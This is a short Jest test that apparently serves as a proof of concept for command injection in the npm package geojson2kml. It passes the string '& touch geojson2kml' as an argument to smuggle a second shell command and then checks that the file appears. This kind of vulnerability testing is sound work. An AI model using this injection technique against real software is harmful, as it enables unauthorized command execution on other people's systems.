test("Command Injection in geojson2kml", (done) => {
  expect.assertions(2);
  const a = require("geojson2kml");
  const fs = require("fs");
  const path = "./geojson2kml";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a("./", "& touch geojson2kml", function (err) {
    if (err) throw err;
    else {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    }
  });
});
